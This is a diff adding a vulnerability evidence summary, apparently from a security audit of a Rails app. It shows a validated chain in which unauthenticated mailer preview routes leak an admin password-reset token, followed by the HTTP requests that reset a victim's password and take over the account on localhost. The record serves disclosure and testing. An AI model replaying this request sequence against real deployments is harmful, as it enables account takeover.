@@ -1,0 +1,23 @@
+VULN-001 — key responses from the validated chain (full transcript in run.log; artefacts in evidence/)
+
+[Leg A — preview renders a live admin token, via runner]
+@@legA token_present=true resolves_id=1 is_admin_take=true admin_email=admin@example.com
+
+[Leg B — inverted guard, read from the running target source]
+@@legB guard_line="before_action :require_local!, unless: :show_previews?"
+@@legB show_previews_pred="ActionMailer::Base.show_previews"
+@@legB routes_mounted_iff_show_previews=true
+
+[Leg C — leaked reset token -> account takeover, over HTTP, on a throwaway victim]
+GET  /passwords/<leaked-token>/edit            -> 200   (token resolves to the victim; mints CSRF token + cookie)
+PATCH /passwords/<leaked-token>                 -> 302 Location: https://localhost:27966/session/new  ("Password has been reset.")
+POST /session (victim + attacker-chosen pw)     -> 302 Location: https://localhost:27966/            (login succeeds = ATO)
+
+[Optional ENABLE_PREVIEWS=1 — unauthenticated route exposure, over HTTP]
+GET /rails/mailers                                              -> 200  (listing; NO cookie)
+GET /rails/mailers/download/passwords_mailer/reset             -> 200  (admin .eml; NO cookie)   [see evidence/reset_email.eml]
+    extracted token -> find_by_token_for(:password_reset, ...) -> id=1 admin=true email=admin@example.com
+baseline revert: GET /rails/mailers                            -> 404  (show_previews restored to false)
+
+See also: evidence/reset_email.eml, evidence/leaked_admin_token.txt, evidence/mailers_index.html,
+evidence/reset_preview.html, evidence/legA_legB_runner.txt, evidence/legC_ato.txt
